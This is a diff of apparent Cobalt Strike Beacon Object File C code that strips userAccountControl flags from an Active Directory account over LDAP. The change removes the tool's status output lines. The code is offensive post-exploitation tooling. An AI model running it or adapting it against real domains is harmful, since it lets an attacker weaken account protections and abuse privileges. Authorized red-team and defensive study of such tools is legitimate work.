@@ -99,10 +99,6 @@ void go(char *args, int alen) {
         return;
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting remove UAC flags operation");
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target: %s %s", targetIdentifier, isTargetDN ? "(DN)" : "(name)");
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Flags to remove: %s", flagsValue);
-
     DWORD flagsToRemove = ParseUACFlags(flagsValue);
     if (flagsToRemove == 0) {
         BeaconPrintf(CALLBACK_ERROR, "[-] No valid flags parsed");
@@ -115,8 +111,6 @@ void go(char *args, int alen) {
         BeaconPrintf(CALLBACK_ERROR, "[!] This would corrupt the account.");
         return;
     }
-
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Parsed flags: 0x%08X", flagsToRemove);
 
     char* dcHostname = NULL;
     LDAP* ld = InitializeLDAPConnection(dcAddress, useLdaps, &dcHostname);
@@ -151,7 +145,6 @@ void go(char *args, int alen) {
             CleanupLDAP(ld);
             return;
         }
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Target DN: %s", targetDN);
     }
 
     // Get current UAC value
@@ -180,7 +173,6 @@ void go(char *args, int alen) {
     WLDAP32$ldap_msgfree(searchResult);
 
     DWORD newUAC = currentUAC & ~flagsToRemove;
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Current UAC: 0x%08X -> New UAC: 0x%08X", currentUAC, newUAC);
 
     char uacString[32];
     MSVCRT$_snprintf(uacString, sizeof(uacString), "%lu", newUAC);
@@ -206,5 +198,4 @@ void go(char *args, int alen) {
     if (defaultNC) MSVCRT$free(defaultNC);
     if (dcHostname) MSVCRT$free(dcHostname);
     CleanupLDAP(ld);
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Operation complete");
 }
